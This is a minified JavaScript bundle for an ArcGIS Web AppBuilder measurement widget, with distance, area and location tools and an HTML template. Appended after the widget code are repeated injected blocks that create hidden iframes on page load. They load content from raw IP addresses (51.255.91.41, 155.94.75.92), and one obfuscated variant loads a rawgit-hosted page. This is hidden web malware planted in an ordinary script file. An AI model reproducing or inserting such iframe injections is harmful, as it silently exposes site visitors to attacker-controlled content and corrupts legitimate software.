d.disconnect(this._mouseMoveMapHandler);this._mouseMoveMapHandler=null;"touch"===this._map.navigationManager.eventModel&&k("ios")&&this._measureDistanceMouseClickHandler(a);a=new q(this._map.spatialReference);a.addPath(this._inputPoints);this._currentGeometry=a;b=this._densifyGeometry(a);this._measureGraphic.geometry=b;"PCS"===this._map.cs?this._geometryServiceLength(a,!0):(this._inputPoints=[],this.onMeasureEnd(this.activeTool,a,this._outputResult(this.result,this.getUnit()),this.getUnit()))},_geometryServiceLength:function(a,
b){var c=new N;c.polylines=[a];c.lengthUnit=9001;c.calculationType="geodesic";this._geometryService.lengths(c,e.hitch(this,function(c){c=c.lengths[0];if(b)this.result=c,this._showDistance(this.result),this._inputPoints=[],this.onMeasureEnd(this.activeTool,a,this._outputResult(this.result,this.getUnit()),this.getUnit());else{var d=this._outputResult(c,this.getUnit());this.result+=c;this._showDistance(this.result);this.onMeasure(this.activeTool,a,this._outputResult(this.result,this.getUnit()),this.getUnit(),
d)}}))},_locationClickHandler:function(a){var b;this._map.snappingManager&&(b=this._map.snappingManager._snappingPoint);a=b||a.mapPoint;this._locationButtonToggle();this._locationGraphic=new p;this._locationGraphic.setGeometry(a);this._locationGraphic.setSymbol(this._pointSymbol);this._map.graphics.add(this._locationGraphic);this._measureGraphics.push(this._locationGraphic);this._calculateLocation(a,!0)},_locationMoveHandler:function(a){var b;this._map.snappingManager&&(b=this._map.snappingManager._snappingPoint);
this._calculateLocation(b||a.mapPoint,!1)},_outputResult:function(a,b){a/=this._unitDictionary[b];0===a?this.resultValue.setContent("\x26nbsp"):1E6<a?this.resultValue.setContent(x.format(a.toPrecision(9),{pattern:this.numberPattern})+" "+b):10>a?this.resultValue.setContent(x.format(a.toFixed(2),{pattern:this.numberPattern+"0"})+" "+b):this.resultValue.setContent(x.format(a.toFixed(2),{pattern:this.numberPattern})+" "+b);return a},_createDistanceUnitList:function(){var a,b=new E({style:"display: none;"});
h.forEach(this._distanceUnitStrings,e.hitch(this,function(a,d){a=new F({label:a,onClick:e.hitch(this,function(){this._switchUnit(this._distanceUnitStringsLong[d])})});a.set("class","unitDropDown");b.addChild(a)}));g.byNode(this._unitDropDown.domNode).set("dropDown",b);this.currentDistanceUnit?(a=this._unitStrings[this.currentDistanceUnit],g.byNode(this._unitDropDown.domNode).set("label",a)):(a=this._unitStrings[this._defaultDistanceUnit],g.byNode(this._unitDropDown.domNode).set("label",a),this.currentDistanceUnit=
this._defaultDistanceUnit)},_createAreaUnitList:function(){var a,b=new E({style:"display: none;"});h.forEach(this._areaUnitStrings,e.hitch(this,function(a,d){a=new F({label:a,onClick:e.hitch(this,function(){this._switchUnit(this._areaUnitStringsLong[d])})});a.set("class","unitDropDown");b.addChild(a)}));g.byNode(this._unitDropDown.domNode).set("dropDown",b);this.currentAreaUnit?(a=this._unitStrings[this.currentAreaUnit],g.byNode(this._unitDropDown.domNode).set("label",a)):(a=this._unitStrings[this._defaultAreaUnit],
g.byNode(this._unitDropDown.domNode).set("label",a),this.currentAreaUnit=this._defaultAreaUnit)},_createLocationUnitList:function(){var a;a=this._locationUnitStrings;var b=new E({style:"display: none;"});if(null===this._geometryService||!1===this.advancedLocationUnits)a=a.slice(0,2);h.forEach(a,e.hitch(this,function(a,d){a=new F({label:a,onClick:e.hitch(this,function(){this._switchLocationUnit(this._locationUnitStringsLong[d])})});a.set("class","unitDropDown");b.addChild(a)}));g.byNode(this._unitDropDown.domNode).set("dropDown",
b);this.currentLocationUnit||(this.currentLocationUnit=this._defaultLocationUnit);a=this._unitStrings[this.currentLocationUnit];g.byNode(this._unitDropDown.domNode).set("label",a);"esriDegreeMinuteSeconds"!==this.currentLocationUnit&&"esriDecimalDegrees"!==this.currentLocationUnit||this._toggleLocationResultsTable(!0,!1)},_drawPointGraphics:function(a){var b=this._pointSymbol,c=this._defaultCustomPointSymbolWidth,d=this._defaultCustomPointSymbolHeight,g,t;a=A.create("div",{"class":"esriLocationResultSymbol"},
a);a=B.createSurface(a,c,d);9>k("ie")&&(g=a.getEventSource(),n.set(g,"position","relative"),n.set(g.parentNode,"position","relative"));b=b.getShapeDescriptors();try{t=a.createShape(b.defaultShape).setFill(b.fill).setStroke(b.stroke)}catch(X){a.clear();a.destroy();return}var h=t.getBoundingBox(),b=h.width;g=h.height;var l=-(h.x+b/2),h=-(h.y+g/2);a=a.getDimensions();a={dx:l+a.width/2,dy:h+a.height/2};if(b>c||g>d)l=b/c>g/d,c=((l?c:d)-5)/(l?b:g),e.mixin(a,{xx:c,yy:c});t.applyTransform(a)}});k("extend-esri")&&
e.setObject("dijit.Measurement",m,P);return m})},"esri/tasks/AreasAndLengthsParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/json dojo/has ../kernel".split(" "),function(l,m,e,h,d,r){l=l(null,{declaredClass:"esri.tasks.AreasAndLengthsParameters",polygons:null,lengthUnit:null,areaUnit:null,calculationType:null,toJson:function(){var d=e.map(this.polygons,function(d){return d.toJson()}),k={};k.polygons=h.toJson(d);d=this.polygons[0].spatialReference;k.sr=
d.wkid?d.wkid:h.toJson(d.toJson());this.lengthUnit&&(k.lengthUnit=this.lengthUnit);this.areaUnit&&(m.isString(this.areaUnit)?k.areaUnit=h.toJson({areaUnit:this.areaUnit}):k.areaUnit=this.areaUnit);this.calculationType&&(k.calculationType=this.calculationType);return k}});d("extend-esri")&&m.setObject("tasks.AreasAndLengthsParameters",l,r);return l})},"esri/tasks/LengthsParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/json dojo/has ../kernel".split(" "),
function(l,m,e,h,d,r){l=l(null,{declaredClass:"esri.tasks.LengthsParameters",polylines:null,lengthUnit:null,geodesic:null,calculationType:null,toJson:function(){var d=e.map(this.polylines,function(d){return d.toJson()}),k={};k.polylines=h.toJson(d);d=this.polylines[0].spatialReference;k.sr=d.wkid?d.wkid:h.toJson(d.toJson());this.lengthUnit&&(k.lengthUnit=this.lengthUnit);this.geodesic&&(k.geodesic=this.geodesic);this.calculationType&&(k.calculationType=this.calculationType);return k}});d("extend-esri")&&
m.setObject("tasks.LengthsParameters",l,r);return l})},"widgets/Measurement/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/Measurement.html":"\x3cdiv class\x3d\"esriMeasurement\"\x3e\r\n  \x3cdiv dojoType\x3d'dijit.layout.ContentPane' class\x3d'esriMeasurementButtonContainer'\x3e\r\n    \x3cdiv dojoType\x3d'dijit.form.ToggleButton' baseClass\x3d'esriButton' dojoAttachPoint\x3d'_areaButton' iconClass\x3d'areaIcon' showLabel\x3d'false' dojoAttachEvent\x3d'onClick:_areaButtonToggle'\x3e\x3c/div\x3e\r\n    \x3cdiv dojoType\x3d'dijit.form.ToggleButton' baseClass\x3d'esriButton' dojoAttachPoint\x3d'_distanceButton' iconClass\x3d'distanceIcon' showLabel\x3d'false' dojoAttachEvent\x3d'onClick:_distanceButtonToggle'\x3e\x3c/div\x3e\r\n    \x3cdiv dojoType\x3d'dijit.form.ToggleButton' baseClass\x3d'esriButton' dojoAttachPoint\x3d'_locationButton' iconClass\x3d'locationIcon' showLabel\x3d'false' dojoAttachEvent\x3d'onClick:_locationButtonToggle'\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d\"esriMeasurementSeparator\"\x3e|\x3c/div\x3e\r\n    \x3cbutton dojoType\x3d'dijit.form.DropDownButton' baseClass\x3d'esriToggleButton' dojoAttachPoint\x3d'_unitDropDown' label\x3d'unit' value\x3d'unit' style\x3d'visibility:hidden;'\x3e\x3c/button\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv dojoType\x3d'dijit.layout.ContentPane' dojoAttachPoint\x3d'resultLabel' class\x3d'resultLabel esriMeasurementResultLabel'\x3e\x3c/div\x3e\r\n  \x3cdiv dojoType\x3d'dijit.layout.ContentPane' dojoAttachPoint\x3d'resultValueContainer' align\x3d'leading' class\x3d\"esriMeasurementResultValue\"\x3e\r\n    \x3cdiv dojoType\x3d'dijit.layout.ContentPane' dojoAttachPoint\x3d'resultValue' class\x3d'result'\x3e\x26nbsp;\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv dojoType\x3d'dijit.layout.ContentPane' dojoAttachPoint\x3d'resultTable' align\x3d'leading' class\x3d\"resultTable esriMeasurementTableContainer\" style\x3d\"display:none;\"\x3e\r\n    \x3ctable class\x3d\"esriMeasurementResultTable\"\x3e\r\n      \x3ctr\x3e\r\n        \x3ctd class\x3d\"esriMeasurementTableHeader\" colspan\x3d\"2\"\x3e${_NLS_Lat}\x3c/td\x3e\x3ctd class\x3d\"esriMeasurementTableHeader\"\x3e${_NLS_Lon}\x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3ctr class\x3d\"esriMeasurementTableRow\" dojoAttachPoint\x3d\"_mouseRow\"\x3e\r\n        \x3ctd dojoAttachPoint\x3d\"mouseCell\"\x3e\x3c/td\x3e\r\n        \x3ctd class\x3d\"esriMeasurementTableCell\"\x3e\r\n          \x3cspan dojoAttachPoint\x3d\"mouseLatitude\" dir\x3d'ltr'\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d\"esriMeasurementTableCell\"\x3e\r\n          \x3cspan dojoAttachPoint\x3d\"mouseLongitude\" dir\x3d'ltr'\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3ctr class\x3d\"esriMeasurementTableRow\"\x3e\r\n        \x3ctd dojoAttachPoint\x3d\"pinCell\"\x3e\x3c/td\x3e\r\n        \x3ctd class\x3d\"esriMeasurementTableCell\"\x3e\r\n          \x3cspan dojoAttachPoint\x3d\"markerLatitude\" dir\x3d'ltr'\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d\"esriMeasurementTableCell\"\x3e\r\n          \x3cspan dojoAttachPoint\x3d\"markerLongitude\" dir\x3d'ltr'\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e",
"url:widgets/Measurement/Widget.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"measurementDiv"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n\r\n',"*now":function(l){l(['dojo/i18n!*preload*widgets/Measurement/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/aspect dojo/Deferred dijit/_WidgetsInTemplateMixin jimu/BaseWidget jimu/portalUtils jimu/dijit/Message esri/units esri/dijit/Measurement esri/symbols/jsonUtils".split(" "),function(l,m,e,h,d,r,D,k,n,A,B){return l([r,d],{name:"Measurement",measurement:null,_pcDef:null,startup:function(){if(!this.measurement&&!this._pcDef){this.inherited(arguments);var d=this.config.measurement;d.map=this.map;d.lineSymbol&&(d.lineSymbol=B.fromJson(d.lineSymbol));d.pointSymbol&&
(d.pointSymbol=B.fromJson(d.pointSymbol));this._processConfig(d).then(m.hitch(this,function(d){this.measurement=new A(d,this.measurementDiv);this.own(e.after(this.measurement,"setTool",m.hitch(this,function(){this.measurement.activeTool?this.disableWebMapPopup():this.enableWebMapPopup()})));this.measurement.startup();this._hideToolsByConfig()}),m.hitch(this,function(d){new k({message:d.message||d})}))}},_processConfig:function(d){this._pcDef=new h;d.defaultLengthUnit&&d.defaultAreaUnit?this._pcDef.resolve(d):
D.getUnits(this.appConfig.portalUrl).then(m.hitch(this,function(e){d.defaultAreaUnit="english"===e?n.SQUARE_MILES:n.SQUARE_KILOMETERS;d.defaultLengthUnit="english"===e?n.MILES:n.KILOMETERS;this._pcDef.resolve(d)}),m.hitch(this,function(e){console.error(e);d.defaultAreaUnit=n.SQUARE_MILES;d.defaultLengthUnit=n.MILES;this._pcDef.resolve(d)}));return this._pcDef.promise},_hideToolsByConfig:function(){!1===this.config.showArea&&this.measurement.hideTool("area");!1===this.config.showDistance&&this.measurement.hideTool("distance");
!1===this.config.showLocation&&this.measurement.hideTool("location")},disableWebMapPopup:function(){this.map.setInfoWindowOnClick(!1)},enableWebMapPopup:function(){this.map.setInfoWindowOnClick(!0)},onDeActive:function(){this.onClose()},onClose:function(){this.measurement&&this.measurement.activeTool&&(this.measurement.clearResult(),this.measurement.setTool(this.measurement.activeTool,!1))},destroy:function(){this.measurement&&this.measurement.destroy();this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});